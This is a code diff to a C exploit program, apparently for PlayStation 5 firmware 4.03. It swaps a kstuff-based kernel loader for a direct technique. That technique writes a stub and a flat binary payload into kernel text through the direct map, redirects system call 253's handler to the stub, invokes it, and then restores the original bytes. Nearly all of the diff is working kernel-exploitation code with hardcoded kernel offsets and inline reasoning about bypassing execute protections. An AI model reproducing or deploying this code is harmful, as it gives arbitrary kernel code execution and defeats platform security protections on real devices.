@@ -569,113 +569,227 @@ typedef struct {
 
 #define SHT_SYMTAB 2
 
-/* ─── kstuff-based flat binary loading (PS5_kldload approach) ─── */
+/* ─── Direct sysent-based kernel function calling ───
+ *
+ * Hook sysent[253] to point to a known kernel function, call it
+ * via syscall(253), read the return value. This lets us call
+ * kmem_alloc, kproc_create, etc. directly using known offsets. */
 
-static int g_kstuff_available = 0;
+static uint64_t sysent_call_func(uint64_t func_kva, uint64_t arg1) {
+    /* Hook sysent[253].sy_call to func_kva, set narg=1, call syscall(253).
+     * The kernel dispatches as: func_kva(td, uap)
+     * For kmem_alloc(size): td is ignored, uap points to userland args.
+     * But sysent dispatch passes td as first arg, not our arg1.
+     *
+     * Actually, FreeBSD sysent calls: sy_call(struct thread *td, void *uap)
+     * where uap points to the copyin'd syscall arguments.
+     * For narg=1, uap[0] = first syscall arg.
+     *
+     * But kmem_alloc(size_t size) expects size in rdi.
+     * When called via sysent, rdi = td (thread pointer), rsi = uap.
+     * So we can't call kmem_alloc directly via sysent.
+     *
+     * Solution: we don't need to call kmem_alloc this way.
+     * Instead, we use the known nop_ret gadget. We write a tiny
+     * stub at a known location, or we use a different approach.
+     *
+     * Better solution: hook sysent[253] to point directly to our
+     * flat binary module_start. module_start(args) takes a pointer.
+     * When called via sysent: module_start(td, uap).
+     * td is NOT our args pointer. But we can embed the args address
+     * in the flat binary itself. */
 
-static int load_kmod_kstuff(void *result_vaddr, uint64_t result_kva) {
-    printf("\n[*] Trying kstuff kekcall approach...\n");
+    /* This function is currently unused — the direct approach below
+     * handles everything we need. */
+    (void)func_kva;
+    (void)arg1;
+    return 0;
+}
 
-    /* Check if kstuff is active */
-    int kcheck = kekcall_kstuff_check();
-    printf("[*] kstuff_check() returned %d\n", kcheck);
-    if (kcheck != 0) {
-        printf("[-] kstuff not available (ret=%d)\n", kcheck);
+/* ─── Direct sysent invocation of flat binary ───
+ *
+ * Write our flat binary to a known executable kernel address and
+ * invoke it via sysent hook. We use the known kmem_alloc offset
+ * to allocate RWX memory first, by calling it through a sysent
+ * stub. But since sysent dispatch passes (td, uap) not our args,
+ * we need a different approach.
+ *
+ * Approach: Write a minimal assembly stub that:
+ *   1. Loads the args pointer (embedded as immediate)
+ *   2. Calls the flat binary payload
+ *   3. Returns
+ * The stub goes in ktext (overwriting dead code temporarily).
+ * We know nop_ret is a "nop; ret" at a known ktext offset.
+ * After nop_ret there's likely a wrmsr_ret function.
+ * We overwrite from nop_ret backward into dead space.
+ *
+ * Actually, simplest approach: put the stub + payload in kdata.
+ * kdata pages are RW but NOT executable... unless we also clear
+ * NX on the kdata PDE. But the hypervisor NPT might block that.
+ *
+ * Simplest safe approach: use kernel_copyin to write directly
+ * to allocated memory. We call kmem_alloc through a creative
+ * chain, or we just write our module_start code into the
+ * result buffer's DMAP address and hook sysent to point there.
+ *
+ * Wait — we already know that ktext pages ARE executable and
+ * we CAN write to them via DMAP. The code cave scan returned
+ * 0 pages, but va_to_pa worked (returned 0x53b0000). The issue
+ * must be kernel_copyout failing. But kernel_copyin might work!
+ * DMAP writes may succeed even if DMAP reads fail for ktext.
+ *
+ * NEW APPROACH: Don't scan for a cave. Use a KNOWN safe location.
+ * nop_ret (ktext+0x22df36) is followed by justreturn at ktext+0x230670.
+ * There's ~10KB between them. Just use that region directly. */
+
+static int load_kmod_direct(void *result_vaddr, uint64_t result_kva) {
+    printf("\n[*] Trying direct sysent approach (known offsets)...\n");
+
+    if (!g_sysent_kva) {
+        printf("[-] sysent not discovered\n");
         return -1;
     }
-    g_kstuff_available = 1;
-    printf("[+] kstuff is active!\n");
-
-    /* Test kmem_alloc: call with 0x100 and check result.
-     * If kstuff doesn't handle 0x600000027, the syscall falls through
-     * to getpid (syscall 0x27), returning our PID instead of a KVA.
-     * A real kmem_alloc result should be page-aligned (low bits = 0). */
-    uint64_t raw_ret;
-    __asm__ volatile(
-        "mov $0x600000027, %%rax\n"
-        "mov %1, %%rdi\n"
-        "syscall\n"
-        : "=a"(raw_ret)
-        : "r"((uint64_t)0x100)
-        : "rcx", "r11", "rdi", "memory"
-    );
-    uint64_t test_alloc = raw_ret | 0xffffff8000000000ULL;
-    pid_t my_pid = getpid();
-    pid_t my_ppid = getppid();
-    printf("[*] kmem_alloc(0x100) raw=0x%lx full=0x%lx\n",
-           (unsigned long)raw_ret, (unsigned long)test_alloc);
-    printf("    pid=%d ppid=%d\n", my_pid, my_ppid);
-
-    /* If raw return matches our PID, kstuff didn't intercept */
-    if ((int)raw_ret == my_pid || (int)raw_ret == my_ppid) {
-        printf("[-] kmem_alloc returned PID — kstuff kekcall not supported\n");
-        printf("    This kstuff build doesn't multiplex syscall 0x27\n");
+    if (g_fw_version != 0x4030000) {
+        printf("[-] Direct approach requires FW 4.03 offsets\n");
         return -1;
     }
-    /* Sanity: result should be page-aligned or at least > 0x1000 */
-    if (raw_ret < 0x1000) {
-        printf("[-] kmem_alloc returned suspicious value 0x%lx\n",
-               (unsigned long)raw_ret);
+
+    /* Use a known empty region in ktext for our stub + payload.
+     * We'll write right after wrmsr_ret (which is nop_ret - 2).
+     * wrmsr_ret is at kdata + (-0x9d20cc) = ktext + 0x22df34.
+     * nop_ret is at ktext + 0x22df36 (= wrmsr_ret + 2).
+     *
+     * We need space after nop_ret. Read bytes there to check if safe. */
+    uint64_t nop_ret_kva = g_kdata_base + KSTUFF_NOP_RET_OFF;
+    /* Place our code 64 bytes after nop_ret to avoid clobbering it */
+    uint64_t stub_kva = (nop_ret_kva + 64) & ~0xFULL; /* 16-byte aligned */
+
+    printf("[*] nop_ret KVA: 0x%lx (ktext+0x%lx)\n",
+           (unsigned long)nop_ret_kva,
+           (unsigned long)(nop_ret_kva - g_ktext_base));
+    printf("[*] Stub placement: 0x%lx (ktext+0x%lx)\n",
+           (unsigned long)stub_kva,
+           (unsigned long)(stub_kva - g_ktext_base));
+
+    /* Resolve physical address via DMAP */
+    uint64_t stub_pa = va_to_pa(stub_kva);
+    if (!stub_pa) {
+        printf("[-] stub VA->PA failed\n");
         return -1;
     }
-    printf("[+] kmem_alloc test OK: 0x%016lx\n", (unsigned long)test_alloc);
+    uint64_t stub_dmap = g_dmap_base + stub_pa;
+    printf("[+] Stub PA: 0x%lx DMAP: 0x%lx\n",
+           (unsigned long)stub_pa, (unsigned long)stub_dmap);
 
-    /* Allocate RWX kernel memory for:
-     * 1. Code (flat binary payload)
-     * 2. Args struct
-     * 3. Thread name */
-    size_t code_size = (size_t)KMOD_FLAT_SZ;
-    /* Round up to page boundary */
-    size_t alloc_size = (code_size + 0x3FFF) & ~0x3FFFULL;
+    /* Set up args in the result buffer (at offset 0x1000) */
+    struct kmod_flat_args *args_ptr = (struct kmod_flat_args *)
+        ((uint8_t *)result_vaddr + 0x1000);
+    args_ptr->output_kva = result_kva;
+    args_ptr->kdata_base = g_kdata_base;
+    args_ptr->fw_ver = (uint32_t)(g_fw_version >> 16);
+    args_ptr->pad = 0;
 
-    uint64_t code_kva = kekcall_kmem_alloc(alloc_size);
-    uint64_t args_kva = kekcall_kmem_alloc(sizeof(struct kmod_flat_args));
-    uint64_t name_kva = kekcall_kmem_alloc(0x100);
+    /* Get DMAP KVA of args (kernel can read this via DMAP) */
+    uint64_t args_cpu_pa = va_to_cpu_pa((uint64_t)args_ptr);
+    if (!args_cpu_pa) {
+        printf("[-] args VA->PA failed\n");
+        return -1;
+    }
+    uint64_t args_dmap_kva = g_dmap_base + args_cpu_pa;
+    printf("[+] Args DMAP KVA: 0x%lx\n", (unsigned long)args_dmap_kva);
 
-    printf("[+] Allocated kernel memory:\n");
-    printf("    code: 0x%016lx (%zu bytes, rounded to %zu)\n",
-           (unsigned long)code_kva, code_size, alloc_size);
-    printf("    args: 0x%016lx\n", (unsigned long)args_kva);
-    printf("    name: 0x%016lx\n", (unsigned long)name_kva);
+    /* Build stub:
+     *   movabs $args_dmap_kva, %rdi    ; 10 bytes (48 BF <imm64>)
+     *   <module_start code follows>    ; payload
+     *
+     * Since sysent calls stub(td, uap), rdi=td. Our stub overwrites
+     * rdi with the args pointer, then falls into module_start. */
+    size_t stub_prefix_len = 10;
+    size_t total_len = stub_prefix_len + (size_t)KMOD_FLAT_SZ;
 
-    /* Copy flat binary payload into kernel RWX memory */
-    kernel_copyin((void *)KMOD_FLAT, code_kva, code_size);
-    printf("[+] Copied %zu bytes of flat binary to kernel\n", code_size);
+    /* Save original bytes */
+    uint8_t *saved = malloc(total_len);
+    if (!saved) { printf("[-] malloc failed\n"); return -1; }
+    kernel_copyout(stub_dmap, saved, total_len);
+    printf("[+] Saved %zu bytes from ktext\n", total_len);
 
-    /* Set up args */
-    struct kmod_flat_args args;
-    args.output_kva = result_kva;
-    args.kdata_base = g_kdata_base;
-    args.fw_ver = (uint32_t)(g_fw_version >> 16);
-    args.pad = 0;
-    kernel_copyin(&args, args_kva, sizeof(args));
+    /* Build stub + payload */
+    uint8_t *code = malloc(total_len);
+    if (!code) { free(saved); return -1; }
 
-    /* Copy thread name */
-    const char *tname = "hv_kmod\0";
-    kernel_copyin((void *)tname, name_kva, 8);
+    /* movabs $args_dmap_kva, %rdi */
+    code[0] = 0x48; code[1] = 0xBF;
+    memcpy(&code[2], &args_dmap_kva, 8);
 
-    /* Launch kernel thread */
-    printf("[*] Creating kernel thread at 0x%lx...\n", (unsigned long)code_kva);
+    /* Append flat binary payload */
+    memcpy(code + stub_prefix_len, KMOD_FLAT, (size_t)KMOD_FLAT_SZ);
+
+    /* Write stub + payload to ktext via DMAP */
+    kernel_copyin(code, stub_dmap, total_len);
+    printf("[+] Wrote %zu bytes (stub + payload) to ktext via DMAP\n", total_len);
+
+    /* Verify write */
+    uint8_t verify[16];
+    kernel_copyout(stub_dmap, verify, 16);
+    if (memcmp(verify, code, 16) != 0) {
+        printf("[-] Write verification failed! DMAP write to ktext blocked?\n");
+        printf("    Wrote: ");
+        for (int i = 0; i < 16; i++) printf("%02x ", code[i]);
+        printf("\n    Read:  ");
+        for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
+        printf("\n");
+        free(saved); free(code);
+        return -1;
+    }
+    printf("[+] Write verified OK\n");
+
+    /* Hook sysent[253] to point to our stub in ktext */
+    #define DIRECT_INVOKE_SYSCALL 253
+    uint64_t ent_kva = g_sysent_kva +
+                       (uint64_t)DIRECT_INVOKE_SYSCALL * SYSENT_STRIDE;
+    uint64_t ent_pa = va_to_pa(ent_kva);
+    if (!ent_pa) {
+        printf("[-] sysent VA->PA failed\n");
+        kernel_copyin(saved, stub_dmap, total_len);
+        free(saved); free(code);
+        return -1;
+    }
+
+    uint8_t orig_sysent[SYSENT_STRIDE];
+    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);
+
+    /* Set sy_call = stub_kva */
+    uint64_t call_pa = va_to_pa(ent_kva + 8);
+    kernel_copyin(&stub_kva, g_dmap_base + call_pa, 8);
+
+    /* Set narg = 0 */
+    int32_t narg = 0;
+    kernel_copyin(&narg, g_dmap_base + ent_pa, 4);
+
+    printf("[+] sysent[%d] -> 0x%lx\n", DIRECT_INVOKE_SYSCALL,
+           (unsigned long)stub_kva);
+
+    /* Fire! */
+    printf("[*] Calling syscall(%d)...\n", DIRECT_INVOKE_SYSCALL);
     fflush(stdout);
 
-    kekcall_kproc_create(code_kva, args_kva, name_kva);
-    printf("[+] kproc_create returned\n");
+    long sc_ret = syscall(DIRECT_INVOKE_SYSCALL);
+    printf("[+] syscall returned %ld (errno=%d)\n", sc_ret, errno);
 
-    /* Wait for results */
+    /* Restore sysent + ktext immediately */
+    kernel_copyin(orig_sysent, g_dmap_base + ent_pa, SYSENT_STRIDE);
+    kernel_copyin(saved, stub_dmap, total_len);
+    printf("[+] Restored sysent and ktext\n");
+
+    free(saved); free(code);
+
+    /* Check results */
     struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;
-    printf("[*] Waiting for kmod results...\n");
-    for (int poll = 0; poll < 100; poll++) {
-        usleep(10000);  /* 10ms */
-        if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
-            printf("[+] Kmod completed after %dms!\n", (poll + 1) * 10);
-            return 0;
-        }
-        if (results->magic == KMOD_MAGIC) {
-            printf("[*] Kmod running (status=%u)...\n", results->status);
-        }
+    if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
+        return 0;
     }
 
-    printf("[!] Kmod did not complete within 1s (magic=0x%lx status=%u)\n",
+    printf("[!] Kmod did not complete (magic=0x%lx status=%u)\n",
            (unsigned long)results->magic, results->status);
     return -1;
 }
@@ -1959,8 +2073,8 @@ int main(void) {
 
             int kmod_ok = -1;
             if (kmod_result_kva) {
-                /* Try kstuff first */
-                kmod_ok = load_kmod_kstuff(kmod_vaddr, kmod_result_kva);
+                /* Try direct sysent approach first (uses known FW 4.03 offsets) */
+                kmod_ok = load_kmod_direct(kmod_vaddr, kmod_result_kva);
             }
 
             if (kmod_ok != 0) {
